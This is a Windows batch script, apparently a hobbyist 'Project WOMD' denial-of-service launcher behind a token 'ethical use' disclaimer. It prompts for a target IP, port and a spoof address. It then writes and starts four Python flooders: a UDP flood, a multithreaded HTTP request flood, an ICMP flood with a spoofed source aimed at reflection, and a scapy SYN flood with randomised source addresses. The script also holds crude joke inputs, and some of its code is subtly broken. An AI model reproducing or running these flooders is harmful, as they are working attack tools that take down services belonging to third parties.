��&cls
@echo off
echo :%random%>>ProjectWOMD.bat
if not exist addons md addons
cd addons
if not exist reset.bat goto notexist
goto aafa
:notexist
echo del aux1.bat                            >reset.bat
echo del aux1.py                             >>reset.bat
echo del aux2.bat                            >>reset.bat
echo del aux2.py                             >>reset.bat
echo del aux3.bat                            >>reset.bat
echo del aux3.py                             >>reset.bat
echo del aux4.bat                            >>reset.bat
echo del aux4.py                             >>reset.bat
echo del message.vbs                         >>reset.bat
echo cd C:\Users\%username%\AppData\Roaming  >>reset.bat
echo del womd.verify                         >>reset.bat
echo exit >>reset.bat
:aafa
title Answer The Agreement!
cls
chcp 65001
:continuer
if exist C:\Users\%username%\AppData\Roaming\womd.verify goto alreadyopenede
cls
echo               [40;31m██╗       ██╗   [40;31m █████╗    [40;37m[40;31m███╗   ███╗   [40;31m██████╗ [40;37m
echo               [40;31m██║  ██╗  ██║   [40;31m██╔══██╗   [40;37m[40;31m████╗ ████║   [40;31m██╔══██╗[40;37m
echo               [40;31m╚██╗████╗██╔╝   [40;31m██║  ██║   [40;37m[40;31m██╔████╔██║   [40;31m██║  ██║[40;37m
echo               [40;31m ████╔═████║ [40;37m   [40;31m██║  ██║[40;37m   [40;37m[40;31m██║╚██╔╝██║[40;37m   [40;31m██║  ██║[40;37m
echo               [40;31m ╚██╔╝ ╚██╔╝ [40;37m██╗[40;31m╚█████╔╝[40;37m██╗[40;37m[40;31m██║ ╚═╝ ██║[40;37m██╗[40;31m██████╔╝[40;37m
echo               [40;31m  ╚═╝   ╚═╝  [40;37m╚═╝[40;31m ╚════╝ [40;37m╚═╝[40;37m[40;31m╚═╝     ╚═╝[40;37m╚═╝[40;31m╚═════╝ [40;37m
Echo.
goto question
:invalidt
echo                     [40;31m INVALID OPTION PLEASE TYPE Yes or No EXACTLY AS SHOWN[40;37m
:question
echo.
echo DO YOU UNDERSTAND THAT THE CREATOR OF THIS IS [40;31mNOT LIABLE[40;37m FOR ANY DAMAGE CAUSED
echo                    AND THAT [40;31mTHIS WAS MADE FOR ETHICAL USE [40;37m
echo.
set /p agreement=Yes or No? (write exactly as shown):
if %agreement%==Yes goto agreeyes
if %agreement%==No goto agreeno
if %agreement%==yes goto agreeyes
if %agreement%==no goto agreeno
goto invalidt
:agreeno
cls
echo You Dont Understand and Agree With That?
echo Then I guess your not using it. 
echo [40;31mGOODBYE
timeout /t 5>nul
exit
pause
exit
:agreeyes
:validkey
cd C:\Users\%username%\AppData\Roaming
echo valid key found>womd.verify
:alreadyopenede
:theverybeginning
@echo off
color 06
cls
title Project WOMD codename: Exc@1ibuR
echo.
echo.
echo                                 xxxxxxxxxxxxx
echo                                  xxxxxxxxxxx   
echo                                   xxxxxxxxx
echo                                    xxxxxxx     
echo                                     xxxxx
echo                                      xxx   
echo                                       x
echo                       xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx
echo                        xxxxxxxxxxxxx     xxxxxxxxxxxxx
echo                         xxxxxxxxxxx       xxxxxxxxxxx
echo                          xxxxxxxxx         xxxxxxxxx
echo                            xxxxxx           xxxxxx
echo                              xxx             xxx
echo.
echo               [40;31m██╗       ██╗   [40;31m █████╗    [40;37m[40;31m███╗   ███╗   [40;31m██████╗ [40;37m
echo               [40;31m██║  ██╗  ██║   [40;31m██╔══██╗   [40;37m[40;31m████╗ ████║   [40;31m██╔══██╗[40;37m
echo               [40;31m╚██╗████╗██╔╝   [40;31m██║  ██║   [40;37m[40;31m██╔████╔██║   [40;31m██║  ██║[40;37m
echo               [40;31m ████╔═████║ [40;37m   [40;31m██║  ██║[40;37m   [40;37m[40;31m██║╚██╔╝██║[40;37m   [40;31m██║  ██║[40;37m
echo               [40;31m ╚██╔╝ ╚██╔╝ [40;37m██╗[40;31m╚█████╔╝[40;37m██╗[40;37m[40;31m██║ ╚═╝ ██║[40;37m██╗[40;31m██████╔╝[40;37m
echo               [40;31m  ╚═╝   ╚═╝  [40;37m╚═╝[40;31m ╚════╝ [40;37m╚═╝[40;37m[40;31m╚═╝     ╚═╝[40;37m╚═╝[40;31m╚═════╝ [40;37m
Echo.
echo                                   Options:
echo                             [[40;31m1[40;37m] Set Up WOMD
echo                             [[40;31m2[40;37m] Attack
echo                             [[40;31m3[40;37m] Reset
echo                             [[40;31m4[40;37m] Start Saved Attack
echo.
:firstquestion
set /p startquestion=Enter Option: [40;31m
if %startquestion%==1 goto setup
if %startquestion%==2 goto attack
if %startquestion%==3 start reset.bat & cls & echo RESETTING & timeout /t 3 >nul & exit
if %startquestion%==4 goto savedattack
if %startquestion%==ilikemen echo me too bro, me too[40;37m & goto firstquestion
if %startquestion%==penis echo 204.96.191.59 [40;37m& goto firstquestion
if %startquestion%==clear cls & echo [40;37m & goto theverybeginning
echo ! INVALID OPTION PLEASE ENTER ONLY THE NUMBERS SHOWN ![40;37m
goto firstquestion
:setup
cls
echo ████████████████████████████████████████████████████████████████████████████
echo █░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█
echo █░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
echo █░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░░░░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█
echo █░░▄▀░░█████████░░▄▀░░█████████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█
echo █░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█
echo █░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
echo █░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█
echo █████████░░▄▀░░█░░▄▀░░█████████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░█████████
echo █░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████
echo █░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████
echo █░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█████░░░░░░█████░░░░░░░░░░░░░░█░░░░░░█████████
echo ████████████████████████████████████████████████████████████████████████████
echo.
echo      This Tool Requires Python3 and Pip (Which Comes With Python3)
echo Please Make Sure You Have Them Installed Before Attempting To Run Setup!
echo.
:ffef
set /p pythoncheck=Do You Have Them Installed? (yes or no): 
if %pythoncheck%==yes goto setupyes
if %pythoncheck%==Yes goto setupyes
if %pythoncheck%==no goto setupno
if %pythoncheck%==No goto setupno
echo ! INVALID OPTION PLEASE TYPE LIKE SHOWN !
goto ffef
:setupyes
echo setting up starting.
timeout /t 1 >nul
echo setting up starting..
echo setting up starting...
timeout /t 2 >nul
echo setting up starting....
pip install scapy
pip install scrapy
pip install sys
pip install time
pip install socket
pip install sockets
pip install random
pip install os
pip3 install sys
pip3 install time
pip3 install socket
pip3 install sockets
pip3 install random
pip3 install os
pip3 install scapy
pip3 install scrapy
cls    
echo.
echo.
echo                                 xxxxxxxxxxxxx
echo                                  xxxxxxxxxxx   
echo                                   xxxxxxxxx
echo                                    xxxxxxx     
echo                                     xxxxx
echo                                      xxx   
echo                                       x
echo                       xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx
echo                        xxxxxxxxxxxxx     xxxxxxxxxxxxx
echo                         xxxxxxxxxxx       xxxxxxxxxxx
echo                          xxxxxxxxx         xxxxxxxxx
echo                            xxxxxx           xxxxxx
echo                              xxx             xxx
echo.
echo               [40;31m██╗       ██╗   [40;31m █████╗    [40;37m[40;31m███╗   ███╗   [40;31m██████╗ [40;37m
echo               [40;31m██║  ██╗  ██║   [40;31m██╔══██╗   [40;37m[40;31m████╗ ████║   [40;31m██╔══██╗[40;37m
echo               [40;31m╚██╗████╗██╔╝   [40;31m██║  ██║   [40;37m[40;31m██╔████╔██║   [40;31m██║  ██║[40;37m
echo               [40;31m ████╔═████║ [40;37m   [40;31m██║  ██║[40;37m   [40;37m[40;31m██║╚██╔╝██║[40;37m   [40;31m██║  ██║[40;37m
echo               [40;31m ╚██╔╝ ╚██╔╝ [40;37m██╗[40;31m╚█████╔╝[40;37m██╗[40;37m[40;31m██║ ╚═╝ ██║[40;37m██╗[40;31m██████╔╝[40;37m
echo               [40;31m  ╚═╝   ╚═╝  [40;37m╚═╝[40;31m ╚════╝ [40;37m╚═╝[40;37m[40;31m╚═╝     ╚═╝[40;37m╚═╝[40;31m╚═════╝ [40;37m
Echo.
echo          Setup Complete :) If some of them failed thats okay and normal
echo          have any issues later after setup? look in fixes.txt for help!
echo                   Press Any Key To Go Back To Start...
pause >nul
goto theverybeginning
exit
:setupno
start https://www.python.org/
cls
echo.
echo.
echo                                 xxxxxxxxxxxxx
echo                                  xxxxxxxxxxx   
echo                                   xxxxxxxxx
echo                                    xxxxxxx     
echo                                     xxxxx
echo                                      xxx   
echo                                       x
echo                       xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx
echo                        xxxxxxxxxxxxx     xxxxxxxxxxxxx
echo                         xxxxxxxxxxx       xxxxxxxxxxx
echo                          xxxxxxxxx         xxxxxxxxx
echo                            xxxxxx           xxxxxx
echo                              xxx             xxx
echo.
echo               [40;31m██╗       ██╗   [40;31m █████╗    [40;37m[40;31m███╗   ███╗   [40;31m██████╗ [40;37m
echo               [40;31m██║  ██╗  ██║   [40;31m██╔══██╗   [40;37m[40;31m████╗ ████║   [40;31m██╔══██╗[40;37m
echo               [40;31m╚██╗████╗██╔╝   [40;31m██║  ██║   [40;37m[40;31m██╔████╔██║   [40;31m██║  ██║[40;37m
echo               [40;31m ████╔═████║ [40;37m   [40;31m██║  ██║[40;37m   [40;37m[40;31m██║╚██╔╝██║[40;37m   [40;31m██║  ██║[40;37m
echo               [40;31m ╚██╔╝ ╚██╔╝ [40;37m██╗[40;31m╚█████╔╝[40;37m██╗[40;37m[40;31m██║ ╚═╝ ██║[40;37m██╗[40;31m██████╔╝[40;37m
echo               [40;31m  ╚═╝   ╚═╝  [40;37m╚═╝[40;31m ╚════╝ [40;37m╚═╝[40;37m[40;31m╚═╝     ╚═╝[40;37m╚═╝[40;31m╚═════╝ [40;37m
Echo.
echo            Please Take A Second To Download Python 3 And Set It As
echo           An Enviromental Variable In The Options While Downloading
echo           MAKE SURE TO CHECK ADD PYTHON 3.8 TO PATH OPTION IN SETUP
echo                  Dont Know How To Do This? Watch This Video:
echo                  https://www.youtube.com/watch?v=UvcQlPZ8ecA
pause >nul
goto theverybeginning
exit
:attack
cls
echo.
echo.
echo                                 xxxxxxxxxxxxx
echo                                  xxxxxxxxxxx   
echo                                   xxxxxxxxx
echo                                    xxxxxxx     
echo                                     xxxxx
echo                                      xxx   
echo                                       x
echo                       xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx
echo                        xxxxxxxxxxxxx     xxxxxxxxxxxxx
echo                         xxxxxxxxxxx       xxxxxxxxxxx
echo                          xxxxxxxxx         xxxxxxxxx
echo                            xxxxxx           xxxxxx
echo                              xxx             xxx
echo.
echo               [40;31m██╗       ██╗   [40;31m █████╗    [40;37m[40;31m███╗   ███╗   [40;31m██████╗ [40;37m
echo               [40;31m██║  ██╗  ██║   [40;31m██╔══██╗   [40;37m[40;31m████╗ ████║   [40;31m██╔══██╗[40;37m
echo               [40;31m╚██╗████╗██╔╝   [40;31m██║  ██║   [40;37m[40;31m██╔████╔██║   [40;31m██║  ██║[40;37m
echo               [40;31m ████╔═████║ [40;37m   [40;31m██║  ██║[40;37m   [40;37m[40;31m██║╚██╔╝██║[40;37m   [40;31m██║  ██║[40;37m
echo               [40;31m ╚██╔╝ ╚██╔╝ [40;37m██╗[40;31m╚█████╔╝[40;37m██╗[40;37m[40;31m██║ ╚═╝ ██║[40;37m██╗[40;31m██████╔╝[40;37m
echo               [40;31m  ╚═╝   ╚═╝  [40;37m╚═╝[40;31m ╚════╝ [40;37m╚═╝[40;37m[40;31m╚═╝     ╚═╝[40;37m╚═╝[40;31m╚═════╝ [40;37m
Echo.
set /p ip=Enter Dst/Target IP: [40;31m
echo target ip set to %ip%
set /p port=Enter Dst/Target Port (usually 80): [40;31m
echo target port set to %port%
set /p spoof=Enter Ip To Spoof: [40;31m
echo [40;37m
echo import sys >>aux1.py
echo import os >>aux1.py
echo import time >>aux1.py
echo import socket >>aux1.py
echo import random >>aux1.py
echo from datetime import datetime >>aux1.py
echo now = datetime.now() >>aux1.py
echo hour = now.hour >>aux1.py
echo minute = now.minute >>aux1.py
echo day = now.day >>aux1.py
echo month = now.month >>aux1.py
echo year = now.year >>aux1.py
echo sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) >>aux1.py
echo bytes = random._urandom(1490) >>aux1.py
echo ip = str("%ip%") >>aux1.py
echo port = int("%port%") >>aux1.py
echo sent = 0 >>aux1.py
echo while True: >>aux1.py
echo     sock.sendto(bytes, (ip,port)) >>aux1.py
echo     sent = sent + 1 >>aux1.py
echo     port - port + 1 >>aux1.py
echo     if port == 65534: >>aux1.py
echo         port = 80 >>aux1.py
echo @echo off >aux1.bat
echo echo attacking %ip% on port %port% DO NOT CLOSE OR IT WILL STOP >>aux1.bat
echo python aux1.py >>aux1.bat
echo import random                                                                                       >aux2.py
echo import socket                                                                                       >>aux2.py
echo import string                                                                                       >>aux2.py
echo import sys                                                                                          >>aux2.py
echo import threading                                                                                    >>aux2.py
echo import time                                                                                         >>aux2.py
echo host = ""                                                                                           >>aux2.py
echo ip = ""                                                                                             >>aux2.py
echo port = 0                                                                                            >>aux2.py
echo num_requests = 0                                                                                    >>aux2.py
echo if len(sys.argv) == 2:                                                                              >>aux2.py
echo     port = 80                                                                                       >>aux2.py
echo     num_requests = 100000000                                                                        >>aux2.py
echo elif len(sys.argv) == 3:                                                                            >>aux2.py
echo     port = int(sys.argv[2])                                                                         >>aux2.py
echo     num_requests = 100000000                                                                        >>aux2.py
echo elif len(sys.argv) == 4:                                                                            >>aux2.py
echo     port = int(sys.argv[2])                                                                         >>aux2.py
echo     num_requests = int(sys.argv[3])                                                                 >>aux2.py
echo else:                                                                                               >>aux2.py
echo     print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")             >>aux2.py
echo     sys.exit(1)                                                                                     >>aux2.py
echo # Convert FQDN to IP                                                                                >>aux2.py
echo try:                                                                                                >>aux2.py
echo     host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")      >>aux2.py
echo     ip = socket.gethostbyname(host)                                                                 >>aux2.py
echo except socket.gaierror:                                                                             >>aux2.py
echo     print (" ERROR\n Make sure you entered a correct website")                                      >>aux2.py
echo     sys.exit(2)                                                                                     >>aux2.py
echo # Create a shared variable for thread counts                                                        >>aux2.py
echo thread_num = 0                                                                                      >>aux2.py
echo thread_num_mutex = threading.Lock()                                                                 >>aux2.py
echo # Print thread status                                                                               >>aux2.py
echo def print_status():                                                                                 >>aux2.py
echo     global thread_num                                                                               >>aux2.py
echo     thread_num_mutex.acquire(True)                                                                  >>aux2.py
echo     thread_num += 1                                                                                 >>aux2.py
echo     #print the output on the sameline                                                               >>aux2.py
echo     sys.stdout.flush()                                                                              >>aux2.py
echo     thread_num_mutex.release()                                                                      >>aux2.py
echo # Generate URL Path                                                                                 >>aux2.py
echo def generate_url_path():                                                                            >>aux2.py
echo     msg = str(string.ascii_letters + string.digits + string.punctuation)                            >>aux2.py
echo     data = "".join(random.sample(msg, 5))                                                           >>aux2.py
echo     return data                                                                                     >>aux2.py
echo # Perform the request                                                                               >>aux2.py
echo def attack():                                                                                       >>aux2.py
echo     url_path = generate_url_path()                                                                  >>aux2.py
echo     # Create a raw socket                                                                           >>aux2.py
echo     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                         >>aux2.py
echo     try:                                                                                            >>aux2.py
echo         # Open the connection on that raw socket                                                    >>aux2.py
echo         dos.connect((ip, port))                                                                     >>aux2.py
echo         # Send the request according to HTTP spec                                                   >>aux2.py
echo         #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))                        >>aux2.py
echo         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()                              >>aux2.py
echo         dos.send(byt)                                                                               >>aux2.py
echo     except socket.error:                                                                            >>aux2.py
echo             print (f"\n [ No connection ]")                                                         >>aux2.py
echo             sys.stdout.flush()                                                                      >>aux2.py
echo     finally:                                                                                        >>aux2.py
echo         # Close our socket gracefully                                                               >>aux2.py
echo         dos.shutdown(socket.SHUT_RDWR)                                                              >>aux2.py
echo         dos.close()                                                                                 >>aux2.py
echo # Spawn a thread per request                                                                        >>aux2.py
echo all_threads = []                                                                                    >>aux2.py
echo for i in range(num_requests):                                                                       >>aux2.py
echo     t1 = threading.Thread(target=attack)                                                            >>aux2.py
echo     t1.start()                                                                                      >>aux2.py
echo     all_threads.append(t1)                                                                          >>aux2.py
echo     # Adjusting this sleep time will affect requests per second                                     >>aux2.py
echo     time.sleep(0.0)                                                                                 >>aux2.py
echo for current_thread in all_threads:                                                                  >>aux2.py
echo     current_thread.join()  # Make the main thread wait for the children threads                     >>aux2.py
echo @echo off >aux2.bat
echo echo Attacking %ip% on port %port% DONT CLOSE >>aux2.bat
echo python aux2.py %ip% %port% 99999999999999999999999999999999 >>aux2.bat
echo from scapy.all import *                                        >aux3.py
echo destination = (str("%spoof%"))                                    >>aux3.py
echo sourcedd = (str("%ip%"))                               >>aux3.py
echo while True:                                                    >>aux3.py
echo     send(IP(src=sourcedd, dst=destination)/ICMP(),verbose = 0) >>aux3.py
echo @echo off >aux3.bat
echo echo Attacking %ip% on port %port% DONT CLOSE >>aux3.bat
echo python aux3.py >>aux3.bat
echo from scapy.all import *                                                                           >aux4.py
echo fatfuck = (str("%ip%"))                                                                           >>aux4.py
echo print("Syn Flooding The IP:",fatfuck,"With Thousands Of Syn Packets, (They Are Being Bombed)")    >>aux4.py
echo target_ip = fatfuck                                                                               >>aux4.py
echo target_port = 80                                                                                  >>aux4.py
echo # ip = IP(dst=target_ip)                                                                          >>aux4.py
echo ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)                                              >>aux4.py
echo tcp = TCP(sport=RandShort(), dport=target_port, flags="S")                                        >>aux4.py
echo raw = Raw(b"X"*1024)                                                                              >>aux4.py
echo p = ip / tcp / raw                                                                                >>aux4.py
echo send(p, loop=1, verbose=0)                                                                        >>aux4.py
echo @echo off >aux4.bat
echo echo Attacking %ip% on port %port% DONT CLOSE >>aux4.bat
echo python aux4.py >>aux4.bat
echo msgbox("Attack Started Do Not Close The Windows Opened Thats Whats Flooding...") >message.vbs
::this is the part where it starts lol
:savedattack
color 06
cls
echo.
echo.
echo                                 xxxxxxxxxxxxx
echo                                  xxxxxxxxxxx   
echo                                   xxxxxxxxx
echo                                    xxxxxxx     
echo                                     xxxxx
echo                                      xxx   
echo                                       x
echo                       xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx
echo                        xxxxxxxxxxxxx     xxxxxxxxxxxxx
echo                         xxxxxxxxxxx       xxxxxxxxxxx
echo                          xxxxxxxxx         xxxxxxxxx
echo                            xxxxxx           xxxxxx
echo                              xxx             xxx
echo.
echo               [40;31m██╗       ██╗   [40;31m █████╗    [40;37m[40;31m███╗   ███╗   [40;31m██████╗ [40;37m
echo               [40;31m██║  ██╗  ██║   [40;31m██╔══██╗   [40;37m[40;31m████╗ ████║   [40;31m██╔══██╗[40;37m
echo               [40;31m╚██╗████╗██╔╝   [40;31m██║  ██║   [40;37m[40;31m██╔████╔██║   [40;31m██║  ██║[40;37m
echo               [40;31m ████╔═████║ [40;37m   [40;31m██║  ██║[40;37m   [40;37m[40;31m██║╚██╔╝██║[40;37m   [40;31m██║  ██║[40;37m
echo               [40;31m ╚██╔╝ ╚██╔╝ [40;37m██╗[40;31m╚█████╔╝[40;37m██╗[40;37m[40;31m██║ ╚═╝ ██║[40;37m██╗[40;31m██████╔╝[40;37m
echo               [40;31m  ╚═╝   ╚═╝  [40;37m╚═╝[40;31m ╚════╝ [40;37m╚═╝[40;37m[40;31m╚═╝     ╚═╝[40;37m╚═╝[40;31m╚═════╝ [40;37m
Echo.
echo           PRESS ANY KEY TO START ATTACK [] OR CLOSE TO SAVE ATTACK
pause >nul
start aux1.bat
start aux2.bat
start aux3.bat
start aux4.bat
start message.vbs
pause




















































:17381
:17704
:18158
:18308
:18475
:18681
:18850
:20186
:20398
:20551
:20594
:20979
:26998
:12052
:12346
:12620
:12656
:12689
:12712
:12734
:13130
:21210
:21279
:21331
:21351
:21749
:23310
:23529
:23809
:5199
:5378
:259
:13517
:24380
:3391
:3466
:3877
:21030
:17922
:17965
:23204
:13794
:1447
:15095
